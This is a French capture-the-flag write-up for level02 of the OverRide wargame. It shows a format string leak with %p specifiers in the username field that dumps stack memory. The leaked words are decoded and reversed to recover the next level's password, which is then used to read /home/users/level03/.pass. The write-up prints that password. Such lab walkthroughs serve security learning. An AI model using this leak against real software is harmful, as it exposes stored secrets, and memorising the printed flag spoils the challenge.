# level02

En faisant plusieurs tests, on remarque qu'on peut essayer d'imprimer du contenu directement à l'aide de l'appel à la fonction printf !
```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: *****************************************
AAAA 0x7fffffffe500 (nil) 0x70 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x70 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x2070252041414141 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```
On note particulièrement qu'on écrit à partir du 28e élément. De plus, on remarque une séquence intéressante entre le 22e et le 26e élément.

En convertissant ces chaines hexadécimales en texte, avec [cet outil](https://www.rapidtables.com/convert/number/hex-to-ascii.html), on se retrouve vraisemblablement avec un flag :
`756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d` => `unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M`

Cependant ce flag ne marche pas ! En observant notre 28e élément, on remarque qu'il est stocké dans un ordre inversé :
`2070252041414141` => ` p% AAAA`

On essaye donc d'inverser chaque string obtenue, puis de reconstruire notre flag :
`unPR47hH` => `Hh74RPnu`
`EAJ5as9Q` => `Q9sa5JAE`
`7zqCWNgX` => `XgNWCqz7`
`5J5hnGXs` => `sXGnh5J5`
`H3gPfK9M` => `M9KfPg3H`
`Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

```bash
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: anyone
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, anyone!
$ cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```